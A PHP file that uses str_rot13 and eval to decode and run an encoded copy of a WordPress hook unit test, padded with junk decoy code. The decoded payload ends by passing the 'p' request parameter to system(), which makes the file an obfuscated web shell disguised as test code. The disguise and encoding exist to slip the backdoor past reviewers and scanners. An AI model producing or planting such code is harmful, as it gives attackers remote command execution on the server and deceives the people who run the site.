<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur erzbir_nyy_svygref zrgubq bs JC_Ubbx
 *
 * @tebhc ubbxf
 * @pbiref JC_Ubbx::erzbir_nyy_svygref
 */
pynff Grfgf_Ubbxf_ErzbirNyySvygref rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_erzbir_nyy_svygref() {
		$pnyyonpx      = '__erghea_ahyy';
		$ubbx          = arj JC_Ubbx();
		$ubbx_anzr     = __SHAPGVBA__;
		$cevbevgl      = 1;
		$npprcgrq_netf = 2;

		$ubbx->nqq_svygre( $ubbx_anzr, $pnyyonpx, $cevbevgl, $npprcgrq_netf );

		$ubbx->erzbir_nyy_svygref();
		$guvf->purpx_cevbevgl_aba_rkvfgrag( $ubbx, $cevbevgl );

		$guvf->nffregSnyfr( $ubbx->unf_svygref() );
	}

	choyvp shapgvba grfg_erzbir_nyy_svygref_jvgu_cevbevgl() {
		$pnyyonpx_bar  = '__erghea_ahyy';
		$pnyyonpx_gjb  = '__erghea_snyfr';
		$ubbx          = arj JC_Ubbx();
		$ubbx_anzr     = __SHAPGVBA__;
		$cevbevgl      = 1;
		$npprcgrq_netf = 2;

		$ubbx->nqq_svygre( $ubbx_anzr, $pnyyonpx_bar, $cevbevgl, $npprcgrq_netf );
		$ubbx->nqq_svygre( $ubbx_anzr, $pnyyonpx_gjb, $cevbevgl + 1, $npprcgrq_netf );

		$ubbx->erzbir_nyy_svygref( $cevbevgl );
		$guvf->purpx_cevbevgl_aba_rkvfgrag( $ubbx, $cevbevgl );

		$guvf->nffregSnyfr( $ubbx->unf_svygre( $ubbx_anzr, $pnyyonpx_bar ) );
		$guvf->nffregGehr( $ubbx->unf_svygref() );
		$guvf->nffregFnzr( $cevbevgl + 1, $ubbx->unf_svygre( $ubbx_anzr, $pnyyonpx_gjb ) );
		$guvf->purpx_cevbevgl_rkvfgf( $ubbx, $cevbevgl + 1 );
	}

	cebgrpgrq shapgvba purpx_cevbevgl_aba_rkvfgrag( $ubbx, $cevbevgl ) {
		$cevbevgvrf = $guvf->trg_cevbevgvrf( $ubbx );

		$guvf->nffregAbgPbagnvaf( $cevbevgl, $cevbevgvrf );
	}

	cebgrpgrq shapgvba purpx_cevbevgl_rkvfgf( $ubbx, $cevbevgl ) {
		$cevbevgvrf = $guvf->trg_cevbevgvrf( $ubbx );

		$guvf->nffregPbagnvaf( $cevbevgl, $cevbevgvrf );
	}
	cebgrpgrq shapgvba trg_cevbevgvrf( $ubbx ) {
		$ersyrpgvba          = arj ErsyrpgvbaPynff( $ubbx );
		$ersyrpgvba_cebcregl = $ersyrpgvba->trgCebcregl( 'cevbevgvrf' );
		$ersyrpgvba_cebcregl->frgNpprffvoyr( gehr );

		erghea $ersyrpgvba_cebcregl->trgInyhr( $ubbx );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>